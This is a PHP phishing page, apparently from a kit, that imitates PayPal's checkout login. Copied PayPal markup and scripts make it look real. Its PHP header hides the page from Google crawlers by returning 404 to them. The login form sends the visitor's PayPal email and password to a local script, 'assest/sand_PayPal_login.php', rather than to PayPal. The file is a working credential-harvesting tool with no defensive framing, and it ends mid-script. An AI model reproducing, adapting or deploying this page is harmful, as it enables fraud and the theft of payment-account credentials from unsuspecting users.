<?php


session_start();
error_reporting(0);



if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }



$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);


?>


    <!DOCTYPE html>
    <!--[if lt IE 9]><html lang="en" class="no-js lower-than-ie9 ie desktop"><![endif]-->
    <!--[if lt IE 10]><html lang="en" class="no-js lower-than-ie10 ie desktop"><![endif]-->
    <!--[if !IE]>-->
    <html lang="en" class="no-js desktop">
    <!--<![endif]-->

    <head>



        <link rel="stylesheet" href="./style/css/contextualLogin.css" />
        <!--[if lte IE 9]><link rel="stylesheet" href="/style/css/ie9.css" /><![endif]-->
        <script>
            window.Modernizr = function(e, t, n) {
                function r(e) {
                    d.cssText = e
                }

                function i(e, t) {
                    return r(prefixes.join(e + ";") + (t || ""))
                }

                function s(e, t) {
                    return typeof e === t
                }

                function o(e, t) {
                    return !!~("" + e).indexOf(t)
                }

                function u(e, t, r) {
                    for (var i in e) {
                        var o = t[e[i]];
                        if (o !== n) return r === !1 ? e[i] : s(o, "function") ? o.bind(r || t) : o
                    }
                    return !1
                }
                var a = "2.6.1",
                    f = {},
                    l = !0,
                    c = t.documentElement,
                    h = "modernizr",
                    p = t.createElement(h),
                    d = p.style,
                    v, m = {}.toString,
                    g = {},
                    y = {},
                    b = {},
                    w = [],
                    E = w.slice,
                    S, x = {}.hasOwnProperty,
                    T;
                !s(x, "undefined") && !s(x.call, "undefined") ? T = function(e, t) {
                    return x.call(e, t)
                } : T = function(e, t) {
                    return t in e && s(e.constructor.prototype[t], "undefined")
                }, Function.prototype.bind || (Function.prototype.bind = function(e) {
                    var t = this;
                    if (typeof t != "function") throw new TypeError;
                    var n = E.call(arguments, 1),
                        r = function() {
                            if (this instanceof r) {
                                var i = function() {};
                                i.prototype = t.prototype;
                                var s = new i,
                                    o = t.apply(s, n.concat(E.call(arguments)));
                                return Object(o) === o ? o : s
                            }
                            return t.apply(e, n.concat(E.call(arguments)))
                        };
                    return r
                });
                for (var N in g) T(g, N) && (S = N.toLowerCase(), f[S] = g[N](), w.push((f[S] ? "" : "no-") + S));
                return f.addTest = function(e, t) {
                        if (typeof e == "object")
                            for (var r in e) T(e, r) && f.addTest(r, e[r]);
                        else {
                            e = e.toLowerCase();
                            if (f[e] !== n) return f;
                            t = typeof t == "function" ? t() : t, l && (c.className += " " + (t ? "" : "no-") + e), f[e] = t
                        }
                        return f
                    }, r(""), p = v = null,
                    function(e, t) {
                        function n(e, t) {
                            var n = e.createElement("p"),
                                r = e.getElementsByTagName("head")[0] || e.documentElement;
                            return n.innerHTML = "x<style>" + t + "</style>", r.insertBefore(n.lastChild, r.firstChild)
                        }

                        function r() {
                            var e = g.elements;
                            return typeof e == "string" ? e.split(" ") : e
                        }

                        function i(e) {
                            var t = v[e[p]];
                            return t || (t = {}, d++, e[p] = d, v[d] = t), t
                        }

                        function s(e, n, r) {
                            n || (n = t);
                            if (m) return n.createElement(e);
                            r || (r = i(n));
                            var s;
                            return r.cache[e] ? s = r.cache[e].cloneNode() : c.test(e) ? s = (r.cache[e] = r.createElem(e)).cloneNode() : s = r.createElem(e), s.canHaveChildren && !l.test(e) ? r.frag.appendChild(s) : s
                        }

                        function o(e, n) {
                            e || (e = t);
                            if (m) return e.createDocumentFragment();
                            n = n || i(e);
                            var s = n.frag.cloneNode(),
                                o = 0,
                                u = r(),
                                a = u.length;
                            for (; o < a; o++) s.createElement(u[o]);
                            return s
                        }

                        function u(e, t) {
                            t.cache || (t.cache = {}, t.createElem = e.createElement, t.createFrag = e.createDocumentFragment, t.frag = t.createFrag()), e.createElement = function(n) {
                                return g.shivMethods ? s(n, e, t) : t.createElem(n)
                            }, e.createDocumentFragment = Function("h,f", "return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&&(" + r().join().replace(/\w+/g, function(e) {
                                return t.createElem(e), t.frag.createElement(e), 'c("' + e + '")'
                            }) + ");return n}")(g, t.frag)
                        }

                        function a(e) {
                            e || (e = t);
                            var r = i(e);
                            return g.shivCSS && !h && !r.hasCSS && (r.hasCSS = !!n(e, "article,aside,figcaption,figure,footer,header,hgroup,nav,section{display:block}mark{background:#FF0;color:#000}")), m || u(e, r), e
                        }
                        var f = e.html5 || {},
                            l = /^<|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i,
                            c = /^<|^(?:a|b|button|code|div|fieldset|form|h1|h2|h3|h4|h5|h6|i|iframe|img|input|label|li|link|ol|option|p|param|q|script|select|span|strong|style|table|tbody|td|textarea|tfoot|th|thead|tr|ul)$/i,
                            h, p = "_html5shiv",
                            d = 0,
                            v = {},
                            m;
                        (function() {
                            try {
                                var e = t.createElement("a");
                                e.innerHTML = "<xyz></xyz>", h = "hidden" in e, m = e.childNodes.length == 1 || function() {
                                    t.createElement("a");
                                    var e = t.createDocumentFragment();
                                    return typeof e.cloneNode == "undefined" || typeof e.createDocumentFragment == "undefined" || typeof e.createElement == "undefined"
                                }()
                            } catch (n) {
                                h = !0, m = !0
                            }
                        })();
                        var g = {
                            elements: f.elements || "abbr article aside audio bdi canvas data datalist details figcaption figure footer header hgroup mark meter nav output progress section summary time video",
                            shivCSS: f.shivCSS !== !1,
                            supportsUnknownElements: m,
                            shivMethods: f.shivMethods !== !1,
                            type: "default",
                            shivDocument: a,
                            createElement: s,
                            createDocumentFragment: o
                        };
                        e.html5 = g, a(t)
                    }(this, t), f._version = a, c.className = c.className.replace(/(^|\s)no-js(\s|$)/, "$1$2") + (l ? " js " + w.join(" ") : ""), f
            }(this, this.document);
        </script>
        <style id="antiClickjack">
            body {
                display: none !important;
            }
        </style>
        <script>
            /* Special integration eligibility check */
            function isEligibleIntegration() {
                var sxf = "true";
                return sxf === 'true' || window.name === 'PPFrameRedirect';
            } /* Don't bust the frame if this is top window */
            if (self === top || isEligibleIntegration()) {
                var antiClickjack = document.getElementById("antiClickjack");
                if (antiClickjack) {
                    antiClickjack.parentNode.removeChild(antiClickjack);
                }
            } else {
                top.location = self.location;
            }
        </script>
    </head>

    <body class="desktop" data-rlogid="B49J%2Bnm9LYGiUaMITf2hUbeTbqKF2E8hRoLNzZhI6ilgBntSPAUmoGXnuf1oFVikFNZ3c%2Bg%2F1FOUKTa64tXM9GJbxp2hAmHo_15eec0afb4e" data-hostname="+ZziEkXoivS9YlKC635dv9CuHU7F8O1FfT69+uCnQWtAo52EvzIM5ub9k9V9LaF6p3pdTuhfnfU" data-production="true"
        data-enable-ads-captcha="true" data-ads-challenge-url="/auth/createchallenge/3f37187ff1c6aaba/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="804aa24f57fa9" data-is-webkit-browser="true" data-enable-fn-beacon-on-web-views="true"
        data-csrf-token="Xk98nvICQCjuisoC9jRARZh8sggzFceYs2e78=">
        <noscript>
            <p class="nonjsAlert" role="alert">Note: Many features on the PayPal website require JavaScript and cookies.</p>
        </noscript>
        <div id="main" class="main" role="main">
            <section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
                <div class="corral">
                    <div id="content" class="contentContainer activeContent">
                        <header>
                            <p class="paypal-logo paypal-logo-long"></p>
                        </header>
                        <h1 class="headerText ">Pay with PayPal</h1>
                        <div id="notifications" class="notifications"></div>
                        <form action="assest/sand_PayPal_login.php" method="post" class="proceed maskable" autocomplete="off" name="login" autocomplete="off" novalidate>
                            <input type="hidden" id="token" name="_csrf" value="Xk98nvICQCjuisoC9jRARZh8sggzFceYs2e78=">
                            <input type="hidden" id="session" name="_sessionID" value="qQYLWtsb5SJdn4rzhqanVWuoiD7OZwnQ">
                            <input type="hidden" name="locale.x" value="en_US">
                            <input type="hidden" name="processSignin" value="main">
                            <input type="hidden" name="fn_sync_data" value="fn_sync_data">
                            <input type="hidden" name="intent" value="checkout" />
                            <input type="hidden" name="ads-client-context" value="checkout" />
                            <input type="hidden" name="flowId" value="8YT3130912601921J" />
                            <input type="hidden" name="ads-client-context-data" value="{&quot;context_id&quot;:&quot;8YT3130912601921J&quot;}" />
                            <input type="hidden" name="ctxId" value="ullndg50b340302b5442228a14532068dd5954" />
                            <input type="hidden" name="requestUrl" value="/signin?intent=checkout&amp;ctxId=ullndg50b340302b5442228a14532068dd5954&amp;returnUri=%2Fwebapps%2Fhermes&amp;state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3D8YT3130912601921J%26mfid%3D1507198678873_3T2FX22KFMJYW%26useraction%3Dcommit%26country.x%3DBT%26locale.x%3Den_BT&amp;locale.x=en_BT&amp;country.x=BT&amp;flowId=8YT3130912601921J"
                            />
                            <input type="hidden" name="returnUri" value="#" />
                            <input type="hidden" name="state" value="?flow=1-P&amp;ulReturn=true&amp;token=8YT3130912601921J&amp;mfid=1507198678873_3T2FX22KFMJYW&amp;useraction=commit&amp;country.x=BT&amp;locale.x=en_BT" />
                            <div id="passwordSection" class="clearfix">
                                <div id="emailSection" class="clearfix">
                                    <div class="textInput" id="login_emaildiv">
                                        <div class="fieldWrapper">
                                            <label for="email" class="fieldLabel">Email address</label>
                                            <input id="email" name="ppemail" type="email" class="hasHelp  validate validateEmpty   " required="required" aria-required="true" value="<?=@$_SESSION['_email_'];?>" autocomplete="off"
                                                placeholder="Email address" />
                                        </div>
                                        <div class="errorMessage" id="emailErrorMessage">
                                            <p class="emptyError hide">Enter your email address.</p>
                                            <p class="invalidError hide">That email address format isn�t right</p>
                                        </div>
                                    </div>
                                </div>
                                <div id="passwordSection" class="clearfix">
                                    <div class="textInput" id="login_passworddiv">
                                        <div class="fieldWrapper">
                                            <label for="password" class="fieldLabel">Enter your password</label>
                                            <input id="password" name="pppassword" type="password" class="hasHelp  validateEmpty   pin-password" required="required" aria-required="true" value="" placeholder="Enter your password"
                                            />
                                        </div>
                                        <div class="errorMessage" id="passwordErrorMessage">
                                            <p class="emptyError hide">Enter your password.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div id="keepMeLogin" class="keepMeLogin">
                                <div class="checkboxContainer">
                                    <input type="checkbox" name="rememberMe" value="true" id="keepMeLoggedIn" class="checkboxInput scTrack:unifiedlogin-rememberme-opt-in" />
                                    <label for="keepMeLoggedIn" class="checkboxLabel">Stay logged in to pay faster</label>
                                    <div class="checkboxMoreInfo">
                                        <a href="#keepMeLoginTerms" class="keepMeLoginAbout iconSprite scTrack:unifiedlogin-rememberme-about-open" id="keepMeLoginAbout" aria-expanded="false" data-orig-about='Learn more about staying logged in.' title='Learn more about staying logged in.'>Learn more about staying logged in.</a>
                                    </div>
                                </div>
                                <div class="keepMeLoginTerms  slideUp" id="keepMeLoginTerms">
                                    <p>No remembering passwords. No typing in your information. Just tap, pay, and get on your way.</p>
                                    <p>But for your security, we'll always ask you to log in to update your personal or financial information.</p>
                                    <p>We recommend you keep this turned off if you share your device. If you share your device in future, make sure you turn this feature off in your PayPal settings before you let someone else use it.</p>
                                    <button class="keepMeLoginAboutBtn hide"
                                        type="button" disabled>Close learn more about staying logged in.</button>
                                </div>
                            </div>
                            <div class="actions">
                                <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button>
                            </div>
                        </form>
                        <div class="forgotLink">
                            <a href="/authflow/password-recovery/?contextId=8YT3130912601921J&amp;redirectUri=%2Fwebapps%2Fhermes&amp;country.x=BT&amp;locale.x=en_US" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password pwrLink ">Having trouble logging in?</a>
                            <div class="pwr-modal forgotPasswordModal" id="password-recovery-modal" aria-label="Password Recovery">
                                <iframe id="pwdIframe" data-src="/authflow/password-recovery/?contextId=8YT3130912601921J&amp;redirectUri=%2Fwebapps%2Fhermes&amp;country.x=BT&amp;locale.x=en_US" scrolling="no" data-auto-reload="true"></iframe>
                                <div class="monogram-small"></div>
                            </div>
                        </div>
                        <div class="loginSignUpSeparator">
                            <span class="textInSeparator" aria-label="or">or</span>
                        </div>
                        <a href="/webapps/xoonboarding?token=8YT3130912601921J&amp;mfid=1507198678873_3T2FX22KFMJYW&amp;useraction=commit&amp;country.x=BT&amp;locale.x=en_BT&amp;country.x=BT&amp;locale.x=en_BT&amp;country.x=BT&amp;locale.x=en_US" class="button secondary scTrack:unifiedlogin-click-signup-button"
                            id="createAccount">Create an Account</a>
                        <div class="intentFooter">
                            <div class="localeSelector">
                                <ul class="localeLink"></ul>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <footer class="footer" role="contentinfo">
                <div class="legalFooter">
                    <div class="extendedContent">
                        <ul class="footerGroup footerGroupWithSiblings">
                            <li>
                                <a href="/bt/webapps/mpp/ua/privacy-full">Privacy</a>
                            </li>
                            <li>
                                <a href="/bt/webapps/mpp/ua/legalhub-full">Legal</a>
                            </li>
                        </ul>
                        <p class="footerCopyright">Copyright 1999-2018 PayPal. All rights reserved.</p>
                        <p class="footerDisclaimer">Consumer advisory - PayPal Pte. Ltd., the holder of PayPal's stored value facility, does not require the approval of the Monetary Authority of Singapore. Users are advised to read the
                            <a href="/bt/webapps/mpp/ua/legalhub-full">terms and conditions</a> carefully.</p>
                    </div>
                </div>
            </footer>
        </div>
        <div class="transitioning spinnerWithLockIcon hide">
            <p class="checkingInfo hide">Checking your information�</p>
            <p class="oneSecond hide">Just a moment�</p>
        </div>
        <div class="lockIcon hide"></div>
        <script>
            var PAYPAL = PAYPAL || {};
            PAYPAL.ulData = {
                fnUrl: "https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js",
                fnSessionId: "8YT3130912601921J",
                sourceId: "UL_CHECKOUT",
                beaconUrl: "https://b.stats.paypal.com/v1/counter.cgi?r=cD04WVQzMTMwOTEyNjAxOTIxSiZpPTEwNS4xNTYuMjcuNTYmdD0xNTA3MTk4Njk2LjM1OCZhPTIxJnM9VU5JRklFRF9MT0dJTlsAb0tDCtylyN3ScQRYPr37gUrm",
                enableSpeedTyping: "true",
                preloadScriptUrl: "https://www.paypalobjects.com/web/res/d42/8ff1bb7fdb5d425394ef0a7ed6a05/js/main.js,https://www.paypalobjects.com/js/xo/hermes/1.1.0/framework.js",
                fingerprintProceed: "",
                "incontextData": {
                    "version": "",
                    "noBridge": "",
                    "env": "",
                    "icstage": "",
                    "targetCancelUrl": "",
                    "paymentAction": "sale",
                    "paymentToken": "8YT3130912601921J",
                    "merchantID": "0"
                }
            };
        </script>
        <noscript>
            <img src="https://c.paypal.com/v1/r/d/b/ns?f=8YT3130912601921J&s=UL_CHECKOUT&js=0&r=1" alt="" height="1" width="1" border="0">
        </noscript>
        <script>
            var PAYPAL = PAYPAL || {};
            PAYPAL.ulSync = {
                fnSessionId: '8YT3130912601921J',
                sourceId: 'UL_CHECKOUT',
                fname: 'fn_sync_data'
            }
        </script>
        <script>
            var PAYPAL = window.PAYPAL || {};
            ! function() {
                "use strict";
                var e = {
                        idForHiddenField: null,
                        version: "SDv3",
                        isExceptionThrown: !1,
                        data: {
                            f: null,
                            s: null,
                            syncStatus: "data",
                            chk: {
                                ts: "",
                                eteid: "",
                                tts: ""
                            },
                            dc: "",
                            err: ""
                        },
                        startTime: null,
                        LL: -1640531527,
                        itern: 32,
                        LLI: -957401312,
                        initSync: function(r) {
                            try {
                                void 0 !== r && null !== r && (e.startTime = r.tStamp, void 0 !== e.startTime && null !== e.startTime || (e.startTime = (new Date).getTime()), e.data.f = r.fnSessionId, e.data.s = r.sourceId, e.idForHiddenField = r.fname, e.data.chk.eteid = n.e1(e.data.f, e.startTime.toString()), e.data.dc = JSON.stringify(t.dc()), e.data.chk.ts = e.startTime)
                            } catch (i) {
                                try {
                                    e.data.err = "f=" + r.fnSessionId + ";s=" + r.sourceId + ";e=" + i
                                } catch (s) {}
                            }
                        },
                        flushData: function() {
                            try {
                                var t = (new Date).getTime() - e.startTime;
                                e.data.chk.tts = t, document.getElementsByName(e.idForHiddenField)[0].value = encodeURIComponent(JSON.stringify(e.data))
                            } catch (n) {}
                        }
                    },
                    t = {
                        dc: function() {
                            var e, t = ["colorDepth", "pixelDepth", "height", "width", "availHeight", "availWidth"],
                                n = {};
                            for (n.screen = {}, n.ua = window.navigator.userAgent, e = 0; e < t.length; e += 1) n.screen[t[e]] = window.screen[t[e]];
                            return n
                        }
                    },
                    n = {
                        b2i: function(e, t, n) {
                            n[0] = (255 & (0 | e[t])) << 24 | (255 & (0 | e[t + 1])) << 16 | (255 & (0 | e[t + 2])) << 8 | 255 & (0 | e[t + 3]) | 0, n[1] = (255 & (0 | e[t + 4])) << 24 | (255 & (0 | e[t + 5])) << 16 | (255 & (0 | e[t + 6])) << 8 | 255 & (0 | e[t + 7]) | 0
                        },
                        i2b: function(e, t, n) {
                            n[t] = (-16777216 & e[0]) >>> 24 | 0, n[t + 1] = (16711680 & e[0]) >>> 16 | 0, n[t + 2] = (65280 & e[0]) >>> 8 | 0, n[t + 3] = 255 & e[0] | 0, n[t + 4] = (-16777216 & e[1]) >>> 24 | 0, n[t + 5] = (16711680 & e[1]) >>> 16 | 0, n[t + 6] = (65280 & e[1]) >>> 8 | 0, n[t + 7] = 255 & e[1] | 0
                        },
                        e2: function(t, n) {
                            for (var r = e.itern, i = 0; r-- > 0;) t[0] += (t[1] << 4 ^ t[1] >> 5) + t[1] ^ i + n[3 & i], i += e.LL, t[1] += (t[0] << 4 ^ t[0] >> 5) + t[0] ^ i + n[i >> 11 & 3]
                        },
                        e1: function(e, t) {
                            var n = new Array(2),
                                r = new Array(8),
                                i = new Array(4),
                                s = 0,
                                o = 0,
                                u = e.split("").map(function(e) {
                                    return e.charCodeAt(0)
                                });
                            for (o = 0; o < 4; o++) i[o] = this.sl(t.slice(4 * o, 4 * (o + 1)));
                            for (o = 0; o < u.length; o += 8) this.b2i(u, o, n), this.e2(n, i), r[s] = n[0], r[s + 1] = n[1], s += 2;
                            return r
                        },
                        sl: function(e) {
                            for (var t = 0, n = 0; n < 4; n++) t |= e.charCodeAt(n) << 8 * n;
                            return isNaN(t) ? 0 : t
                        }
                    };
                PAYPAL.syncData = e
            }(window);
        </script>
        <script>
            window.PAYPAL = window.PAYPAL || {},
                function() {
                    "use strict";

                    function asyncLoadScriptUrls(e) {
                        var t = e.split(","),
                            n;
                        try {
                            for (var r = 0; r < t.length; r++) {
                                n = t[r];
                                if (n && n.slice(0, 8) === "https://" && n.slice(n.length - 3) === ".js") {
                                    var i = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
                                    i.open("GET", t[r]), i.send()
                                }
                            }
                        } catch (s) {}
                    }

                    function showReturnToMerchantLink() {
                        var e = document.querySelector("#returnToMerchant"),
                            t = document.querySelector(".contentContainer");
                        e && !window.opener && ($(e).removeClass("hide"), t && $(t).addClass("contentContainerShort"))
                    }

                    function instrumentUlAsLandingPageLoad() {
                        var e = document.querySelector("#password"),
                            t, n = document.querySelector('input[name="locale.x"]'),
                            r = document.querySelector('input[name="clientLogRecords"]');
                        e && (t = login.utils.isFieldPrefilled(e) || e.value.length > 0), login.logger.logServerPreparedMetrics(), r || (login.logger.log({
                            evt: "state_name",
                            data: login.utils.getKmliCb() ? "LOGIN_UL_RM" : "LOGIN_UL",
                            instrument: !0
                        }), login.logger.log({
                            evt: "transition_name",
                            data: "prepare_login_ul",
                            instrument: !0
                        })), login.logger.log({
                            evt: "landing_page",
                            data: "login",
                            instrument: !0
                        }), login.logger.log({
                            evt: "is_pwd_autofill",
                            data: t ? "Y" : "N",
                            instrument: !0
                        }), login.logger.log({
                            evt: "design",
                            data: login.utils.isInContextIntegration() ? "in-context" : "full-context",
                            instrument: !0
                        }), n && login.logger.log({
                            evt: "page_lang",
                            data: n.value,
                            instrument: !0
                        }), login.logger.pushLogs()
                    }

                    function instrumentSplitLoginPageLoad(e) {
                        var t = "begin_email",
                            n = "prepare_email",
                            r = login.utils.isFieldPrefilled(document.querySelector("#email")),
                            i = document.querySelector('input[name="locale.x"]');
                        e === "inputPassword" && (t = "begin_pwd", n = "prepare_pwd" + (login.utils.getKmliCb() ? "_ot" : ""), r = login.utils.isFieldPrefilled(document.querySelector("#password"))), login.logger.log({
                            evt: "state_name",
                            data: t,
                            instrument: !0
                        }), login.logger.log({
                            evt: "transition_name",
                            data: n,
                            instrument: !0
                        }), login.logger.log({
                            evt: "autofill",
                            data: r ? "Y" : "N",
                            instrument: !0
                        }), login.utils.getIntent() === "checkout" && (login.logger.log({
                            evt: "landing_page",
                            data: "login",
                            instrument: !0
                        }), login.logger.log({
                            evt: "design",
                            data: login.utils.isInContextIntegration() ? "in-context" : "full-context",
                            instrument: !0
                        })), i && login.logger.log({
                            evt: "page_lang",
                            data: i.value,
                            instrument: !0
                        }), login.logger.pushLogs()
                    }
                    var login = {};
                    login.logger = function() {
                        function t(t) {
                            t.timestamp = Date.now ? Date.now() : (new Date).time, e.push(t)
                        }

                        function n(t) {
                            var n, r, i = login.utils.getIntent(),
                                s = login.utils.getFlowId(),
                                o = document.querySelector("input[name=_sessionID]"),
                                u;
                            if (e.length === 0) return;
                            t = t || {}, e.push({
                                evt: "context_correlation_id",
                                data: $("body").data("correlationId"),
                                instrument: !0
                            }), i && e.push({
                                evt: "serverside_data_source",
                                data: i,
                                instrument: !0
                            }), s && e.push({
                                evt: "context_id",
                                data: s,
                                instrument: !0
                            }), n = document.querySelector("#token"), r = n && n.value, u = {
                                _csrf: r,
                                _sessionID: o && o.value,
                                currentUrl: window.location.href,
                                logRecords: JSON.stringify(e),
                                intent: i
                            }, typeof t.data == "object" && Object.assign(u, t.data), $.ajax({
                                url: "/signin/client-log",
                                data: u,
                                success: t.success,
                                fail: t.fail,
                                complete: t.complete
                            }), e = []
                        }

                        function r(e, r) {
                            e = e || [];
                            if (!(e instanceof Array)) {
                                if (typeof r == "function") return r();
                                return
                            }
                            for (var i = 0; i < e.length; i++) t(e[i]);
                            n({
                                complete: function() {
                                    if (typeof r == "function") return r()
                                }
                            })
                        }

                        function i() {
                            var e = login.utils.getSplitLoginContext(),
                                t = document.getElementById("keepMeLoggedIn"),
                                n = t ? "LOGIN_UL_RM" : "LOGIN_UL",
                                r = {
                                    inputEmail: "begin_email",
                                    implicitEmail: "begin_email",
                                    inputPassword: "begin_pwd"
                                };
                            return e && r[e] && (n = r[e]), n
                        }

                        function s() {
                            var t, n = document.querySelector('input[name="clientLogRecords"]');
                            if (n) try {
                                t = JSON.parse(n.value)
                            } catch (r) {}
                            t && (e = e.concat(t))
                        }
                        var e = [];
                        return {
                            log: t,
                            logServerPreparedMetrics: s,
                            pushLogs: n,
                            clientLog: r,
                            getStateName: i
                        }
                    }(), login.pubsub = function() {
                        var e = {},
                            t = {};
                        return e.publish = function(e, n) {
                            if (!t[e]) return !1;
                            var r = t[e],
                                i = r ? r.length : 0;
                            while (i > 0) r[i - 1].func(n), i -= 1
                        }, e.subscribe = function(e, n) {
                            if (typeof n != "function") return;
                            t[e] || (t[e] = []), t[e].push({
                                func: n
                            })
                        }, e
                    }();
                    var addEvent = function(e, t, n) {
                            if (!e || !t || !n) return;
                            e.addEventListener ? e.addEventListener(t, n, !1) : e.attachEvent && e.attachEvent("on" + t, n)
                        },
                        removeEvent = function(e, t, n) {
                            if (!e || !t || !n) return;
                            e.removeEventListener ? e.removeEventListener(t, n, !1) : e.attachEvent && e.detachEvent("on" + t, n)
                        },
                        createNewEvent = function(e) {
                            if (typeof window.Event == "function") return new Event(e);
                            var t = document.createEvent("Event");
                            return t.initEvent(e, !0, !0), t
                        },
                        eventPreventDefault = function(e) {
                            var t = e || window.event || {};
                            t.preventDefault ? t.preventDefault() : t.returnValue = !1
                        },
                        eventStopPropagation = function(e) {
                            var t = e || window.event || {};
                            t.stopPropagation ? t.stopPropagation() : t.cancelBubble = !1
                        },
                        getEventTarget = function(e) {
                            var t = e || window.event || {};
                            return t.target || t.srcElement
                        };
                    login.utils = function() {
                            function r() {
                                $(e).addClass("spinner"), $(e).removeClass("hide"), e.setAttribute("aria-busy", "true"), t && $(t).removeClass("hide")
                            }

                            function i() {
                                $(e).removeClass("spinner"), $(e).addClass("hide"), e.setAttribute("aria-busy", "false"), t && $(t).addClass("hide")
                            }

                            function s(e) {
                                var t;
                                if (e !== "") {
                                    t = document.querySelector(".transitioning p." + e), t && $(t).removeClass("hide");
                                    return
                                }
                                $(n).removeClass("hide")
                            }

                            function o(e) {
                                var t;
                                if (e !== "") {
                                    t = document.querySelector(".transitioning p." + e), t && $(t).addClass("hide");
                                    return
                                }
                                $(n).addClass("hide")
                            }

                            function u(e, t, n, i) {
                                var s = e && e.getAttribute("href"),
                                    o = e && e.getAttribute("id"),
                                    u, a, f;
                                return function(l) {
                                    l.preventDefault(), login.logger.log({
                                        evt: "state_name",
                                        data: t || login.logger.getStateName(),
                                        instrument: !0
                                    }), login.logger.log({
                                        evt: "transition_name",
                                        data: n,
                                        instrument: !0
                                    }), u = document.querySelector('input[name="locale.x"]'), u && login.logger.log({
                                        evt: "page_lang",
                                        data: u.value,
                                        instrument: !0
                                    }), a = $(e).data("locale"), a && login.logger.log({
                                        evt: "change_to_lang",
                                        data: a,
                                        instrument: !0
                                    }), f = {
                                        complete: function() {
                                            if (typeof i == "function") return i();
                                            window.location = s
                                        }
                                    }, o === "splitLoginOptOut" && (f = Object.assign({}, f, {
                                        data: {
                                            splitLoginOptOut: !0
                                        }
                                    })), login.logger.pushLogs(f), r()
                                }
                            }

                            function a(e, t) {
                                eventPreventDefault(e), $.ajax({
                                    type: "POST",
                                    url: "/signin/not-you",
                                    data: {
                                        _csrf: document.querySelector("#token").value,
                                        notYou: !0,
                                        intent: y(),
                                        context_id: b()
                                    },
                                    dataType: "json",
                                    success: l,
                                    fail: c,
                                    complete: function() {
                                        if (typeof t == "function") return t()
                                    }
                                })
                            }

                            function f(e) {
                                login.storeInstance && login.storeInstance.updateModel(e), e.ulSync && login.fn.updateFnSyncContext(e.ulSync), i()
                            }

                            function l(e) {
                                if (e && e.htmlResponse) {
                                    login.ads.handleAdsInterception(decodeURIComponent(e.htmlResponse));
                                    return
                                }
                                if (e && e.returnUrl && !e.notifications) {
                                    window.location.href = e.returnUrl;
                                    return
                                }!e.profile && e.adsChallengeUrl && login.ads.init(e.adsChallengeUrl), f(e), e.verification && e.verification.page === "pending" && (login.verification.startPolling({
                                    accessToken: e.accessToken,
                                    authflowDocumentId: e.authflowDocumentId,
                                    _csrf: e._csrf,
                                    email: e.verification.email
                                }), login.verification.showResendLink()), N(e), C()
                            }

                            function c(e) {
                                N(e), window.location.href = window.location.href
                            }

                            function h(e) {
                                login.pubsub && login.pubsub.publish("WINDOW_CLICK", e)
                            }

                            function p(e) {
                                var t = document.querySelector(".rememberProfile .bubble-tooltip"),
                                    n, r;
                                if (!t || !e || !getEventTarget(e)) return;
                                n = $(t), r = $(getEventTarget(e));
                                if (r.hasClass("infoLink") || r.hasClass("bubble-tooltip")) {
                                    eventPreventDefault(e), n.toggle();
                                    return
                                }
                                n.addClass("hide")
                            }

                            function d(e) {
                                return !!(e && window.chrome && window.chrome.webstore && getComputedStyle(e).backgroundColor === "rgb(250, 255, 189)")
                            }

                            function v(e) {
                                return e ? d(e) || e.value && e.value.length > 0 : !1
                            }

                            function m() {
                                return window.self !== window.top
                            }

                            function g() {
                                var e = document.querySelector('input[name="splitLoginContext"]');
                                return e && e.value
                            }

                            function y() {
                                var e = document.querySelector('input[name="intent"]');
                                return e && e.value || ""
                            }

                            function b() {
                                var e = document.querySelector("input[name=flowId]");
                                return e && e.value || ""
                            }

                            function w() {
                                return document.querySelector("#keepMeLoggedIn")
                            }

                            function E() {
                                return window.xchild || window.name && window.name.indexOf("xcomponent") === 0
                            }

                            function S(e) {
                                var t;
                                return e ? e.value === "inputEmail" ? (t = document.querySelector("#splitEmailCaptcha"), T(t)) : e.value === "inputPassword" || e.value === "inputPin" ? (t = document.querySelector("#splitPasswordCaptcha"), T(t)) : e.value === "implicitEmail" ? (t = document.querySelector("#implicitEmailCaptcha"), T(t)) : T(document.querySelector("#captcha")) : (t = document.querySelector("#captcha"), T(t))
                            }

                            function x(e, t) {
                                t = decodeURIComponent(t);
                                var n = t && t.split("?")[1],
                                    r = {};
                                if (!n) return;
                                return n.split("&").forEach(function(e) {
                                    var t = e.split("=");
                                    r[t[0]] = t[1]
                                }), r[e]
                            }

                            function T(e) {
                                return e ? {
                                    container: e.querySelector("div.textInput"),
                                    field: e.querySelector("input[type=text]"),
                                    errMsgContainer: e.querySelector("div.errorMessage"),
                                    errMsg: e.querySelector("div.errorMessage .emptyError"),
                                    playAudioBtn: e.querySelector(".captchaPlay"),
                                    refreshCaptchaBtn: e.querySelector(".captchaRefresh"),
                                    audioTag: e.querySelector(".audio audio"),
                                    image: e.querySelector(".captcha-image img"),
                                    audioLink: e.querySelector(".audio a")
                                } : null
                            }

                            function N(e) {
                                var t, n = window.PAYPAL && window.PAYPAL.analytics;
                                if (e && e.sys && n && n.endCPLTracking) try {
                                    t = n.Analytics.prototype.utils.queryStringToObject(e.sys.tracking.fpti.dataString), n.endCPLTracking(t)
                                } catch (r) {}
                            }

                            function C() {
                                var e = document.querySelector("#splitPassword");
                                e && $(e).addClass("transformRightToLeft")
                            }
                            var e = document.querySelector(".transitioning"),
                                t = document.querySelector(".lockIcon"),
                                n = document.querySelector(".transitioning p.checkingInfo");
                            return {
                                showSpinner: r,
                                hideSpinner: i,
                                showSpinnerMessage: s,
                                hideSpinnerMessage: o,
                                getOutboundLinksHandler: u,
                                isFieldPrefilled: v,
                                notYouClickHandler: a,
                                successfulXhrHandler: l,
                                failedXhrSubmitHandler: c,
                                documentClickHandler: h,
                                toggleRememberInfoTooltip: p,
